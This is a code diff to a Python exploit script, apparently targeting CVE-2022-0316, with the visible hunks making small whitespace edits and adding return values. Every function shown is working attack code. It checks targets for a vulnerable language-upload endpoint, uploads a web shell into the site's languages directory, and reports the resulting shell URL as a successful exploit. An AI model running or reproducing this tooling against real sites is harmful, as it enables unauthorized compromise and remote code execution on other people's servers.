@@ -31,13 +31,13 @@ def upload_shell(session, profile_url_url, shell_name):
             print(f"{Style.BRIGHT}{Fore.GREEN}[•] Shell uploaded successfully!")
             shell_url = profile_url_url.replace("include/lang_upload.php", f"languages/{shell_name}")
             print(f"{Style.BRIGHT}{Fore.CYAN}[•] Shell URL: {shell_url}")
-            return shell_url
+            return shell_url 
         else:
             print(f"{Style.BRIGHT}{Fore.RED}[•] Shell upload failed.")
-            return None
+            return None 
     except Exception as e:
         print(f"{Style.BRIGHT}{Fore.RED}[•] Error uploading shell: {e}")
-        return None
+        return None 
 
 def check_vulnerability(session, profile_url):
     try:
@@ -49,14 +49,14 @@ def check_vulnerability(session, profile_url):
 
             if 'Please select Mo file' in response.text:
                 print(f"{Style.BRIGHT}{Fore.GREEN}[•] Vulnerable endpoint found: {test_url}")
-                return test_url
+                return test_url  
             else:
                 print(f"{Style.BRIGHT}{Fore.CYAN}[•] Not vulnerable: {test_url}")
 
-        return None
+        return None  
     except Exception as e:
         print(f"{Style.BRIGHT}{Fore.RED}[•] Error checking vulnerability: {e}")
-        return None
+        return None 
 
 def scan_cve_2022_0316(profile_url):
     session = requests.Session()
@@ -73,5 +73,9 @@ def scan_cve_2022_0316(profile_url):
             print(f"{Style.BRIGHT}{Fore.GREEN}[•] Exploit successful! Shell available at: {shell_url}")
         else:
             print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed. Could not upload shell.")
+            return False 
     else:
         print(f"{Style.BRIGHT}{Fore.RED}[•] No vulnerable endpoints found for {profile_url}.")
+        return False  
+
+    return True  
